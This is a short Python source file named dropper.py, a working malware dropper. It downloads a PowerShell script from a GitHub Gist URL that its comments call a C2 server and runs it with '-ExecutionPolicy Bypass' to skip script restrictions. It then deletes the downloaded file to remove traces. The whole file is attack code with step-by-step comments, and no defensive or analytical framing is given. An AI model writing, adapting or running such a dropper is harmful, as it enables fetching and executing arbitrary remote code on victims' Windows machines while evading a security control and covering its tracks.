# dropper.py

import requests
import subprocess
import os

# --- CONFIGURATION ---
# Paste the "Raw" URL you copied from your GitHub Gist here.
C2_URL = "https://gist.githubusercontent.com/nithiya-rajesh/ea28f5adc712dc3fb07f1ffe259f60be/raw/6f3e6c5ead0598b30cdb3f58bdbdc909e91bc5de/payload.ps1"
PAYLOAD_NAME = "payload.ps1"

def download_payload():
    """Downloads the payload from the C2 server."""
    try:
        print(f"[*] Downloading payload from {C2_URL}...")
        response = requests.get(C2_URL)
        
        # Raise an exception if the download failed.
        response.raise_for_status()
        
        # Write the downloaded content to a local file.
        with open(PAYLOAD_NAME, "w") as f:
            f.write(response.text)
            
        print(f"[+] Payload successfully downloaded as {PAYLOAD_NAME}")
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Error downloading payload: {e}")
        return False

def execute_payload():
    """Executes the PowerShell payload."""
    try:
        print(f"[*] Executing payload: {PAYLOAD_NAME}...")
        
        # --- CORE ACTION ---
        # We use subprocess.run to execute a command on the system.
        # 'powershell.exe' is the program we're running.
        # '-ExecutionPolicy Bypass' tells PowerShell to ignore script execution restrictions for this command only.
        # '-File' specifies the script we want to run.
        command = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", PAYLOAD_NAME]
        subprocess.run(command, check=True, capture_output=True, text=True)
        
        print("[+] Payload executed successfully.")
        
    except subprocess.CalledProcessError as e:
        # This will catch errors if the script itself fails to run.
        print(f"[!] Error executing payload: {e}")
        print(f"    Stderr: {e.stderr}")
    except FileNotFoundError:
        print("[!] Error: powershell.exe not found. Is this a Windows system?")

def cleanup():
    """Removes the payload file after execution."""
    try:
        print(f"[*] Cleaning up {PAYLOAD_NAME}...")
        os.remove(PAYLOAD_NAME)
        print("[+] Cleanup complete.")
    except OSError as e:
        print(f"[!] Error during cleanup: {e}")

def main():
    """Main orchestrator function."""
    if download_payload():
        execute_payload()
        cleanup()

if __name__ == "__main__":
    main()
